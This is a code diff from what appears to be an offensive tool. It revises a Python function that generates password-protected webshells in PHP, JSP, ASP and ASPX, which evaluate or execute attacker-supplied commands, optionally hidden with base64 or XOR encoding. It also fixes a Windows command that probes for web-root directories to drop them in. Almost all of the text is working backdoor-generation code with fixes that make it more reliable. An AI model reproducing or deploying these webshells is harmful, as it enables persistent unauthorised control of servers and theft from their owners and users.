@@ -3381,26 +3381,34 @@ def _gen_webshell(lang, password, encoding, key=None):
     pw = password or "dk"
     encoding = (encoding or "plain").strip().lower()
     xk = (key or "").strip() or "dkx0r"      # 四处 xor 密钥统一从这里取，别再硬编码
-    # C#/Java 字符串字面量里要转义反斜杠和双引号
-    esc = lambda s: (s or "").replace("\\", "\\\\").replace('"', '\\"')
+    # 四种语言的字符串字面量转义规则各不相同，**绝不能混用一套**：
+    #   PHP 单引号串：只认 \\ 和 \'（\" 不会被识别，反而是 \ + " 两个字符）
+    #   Java / C# 双引号串：认 \\ 和 \"（\b \n \t 等还会被当成转义字符，必须先把 \ 翻倍）
+    #   VBScript 双引号串：串内一个双引号要写成两个 ""
+    esc_php = lambda s: (s or "").replace("\\", "\\\\").replace("'", "\\'")
+    esc_java = lambda s: (s or "").replace("\\", "\\\\").replace('"', '\\"')
+    esc_vbs = lambda s: (s or "").replace('"', '""')
+    esc = esc_java                       # aspx / C# 沿用 Java 规则
     ext = {"php": ".php", "jsp": ".jsp", "asp": ".asp", "aspx": ".aspx"}.get(lang, ".php")
     if lang == "php":
+        epw, ek = esc_php(pw), esc_php(xk)
         if encoding == "base64":
-            code = "<?php if(isset($_POST['%s'])){@eval(base64_decode($_POST['%s']));}?>" % (pw, pw)
+            code = "<?php if(isset($_POST['%s'])){@eval(base64_decode($_POST['%s']));}?>" % (epw, epw)
         elif encoding == "xor":
             code = ("<?php $k='%s'; if(isset($_POST['%s'])){$d=base64_decode($_POST['%s']);"
                     "$c='';for($i=0;$i<strlen($d);$i++){$c.=$d[$i]^$k[$i%%strlen($k)];}@eval($c);}?>"
-                    % (xk, pw, pw))
+                    % (ek, epw, epw))
         else:
-            code = "<?php if(isset($_POST['%s'])){@eval($_POST['%s']);}?>" % (pw, pw)
+            code = "<?php if(isset($_POST['%s'])){@eval($_POST['%s']);}?>" % (epw, epw)
     elif lang == "jsp":
+        epw, ek = esc_java(pw), esc_java(xk)
         head = '<%@ page import="java.io.*,java.util.*" %>\n'
         if encoding == "base64":
             body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){byte[] cb="
                     "Base64.getDecoder().decode(p); String cmd=new String(cb);"
                     "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",cmd});"
                     "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
-                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % pw)
+                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % epw)
         elif encoding == "xor":
             body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){byte[] db="
                     "Base64.getDecoder().decode(p); String k=\"%s\";byte[] cb="
@@ -3408,12 +3416,12 @@ def _gen_webshell(lang, password, encoding, key=None):
                     "(db[i]^(byte)k.charAt(i%%k.length()));} String cmd=new String(cb);"
                     "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",cmd});"
                     "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
-                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % (pw, xk))
+                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % (epw, ek))
         else:
             body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){"
                     "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",p});"
                     "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
-                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % pw)
+                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % epw)
         code = head + body
     elif lang == "aspx":
         # aspx 跑在 Windows / IIS 上 —— 用 cmd.exe /c 起进程并回显，**绝不能用 sh**
@@ -3449,7 +3457,8 @@ def _gen_webshell(lang, password, encoding, key=None):
         code = head + body + tail
     else:  # asp：plain / base64 / xor 三种编码均真实生效（与 PHP/JSP 一致）
         # 与 PHP/JSP 共用同一把 xor 密钥，保证客户端编码逻辑一致
-        ASP_XOR_KEY = xk
+        epw, ek = esc_vbs(pw), esc_vbs(xk)
+        ASP_XOR_KEY = ek
         # base64：用 MSXML 做 base64 解码得到原始 VBScript 字节流，再 ExecuteGlobal
         asp_b64 = (
             "<%%\r\n"
@@ -3505,11 +3514,11 @@ def _gen_webshell(lang, password, encoding, key=None):
             "%%>"
         )
         if encoding == "base64":
-            code = asp_b64 % pw
+            code = asp_b64 % epw
         elif encoding == "xor":
-            code = asp_xor % (pw, ASP_XOR_KEY)
+            code = asp_xor % (epw, ASP_XOR_KEY)
         else:
-            code = "<%% If Request(\"%s\")<>\"\" Then ExecuteGlobal(Request(\"%s\")) End If %%>" % (pw, pw)
+            code = "<%% If Request(\"%s\")<>\"\" Then ExecuteGlobal(Request(\"%s\")) End If %%>" % (epw, epw)
     return code, ext
 
 
@@ -3531,9 +3540,14 @@ _WIN_WEBROOTS = [
 
 
 def _win_webroot_probe():
-    """Windows web 根探测命令：单条 cmd 命令，for + %~d 去掉引号，不需要 & 串联。"""
+    """Windows web 根探测命令：单条 cmd 命令，for + %~i 去掉引号，不需要 & 串联。
+
+    变量名必须用 i 这类「非修饰符字母」：d/p/n/x/f/s/t/z/a 在 %~ 后面是路径修饰符，
+    写成 for %d ... %~d 时 cmd 会按修饰符解析（实测 cmd /c *.bat 下直接报
+    「批处理参数替换中的路径运算符的下列用法无效」），只有交互式 cmd 侥幸能跑通。
+    """
     items = " ".join('"%s"' % r for r in _WIN_WEBROOTS)
-    return 'for %d in (' + items + ') do @if exist "%~d\\." echo DK_ROOT:%~d'
+    return 'for %i in (' + items + ') do @if exist "%~i\\." echo DK_ROOT:%~i'
 
 
 def _detect_shell_os(sid, timeout=6):
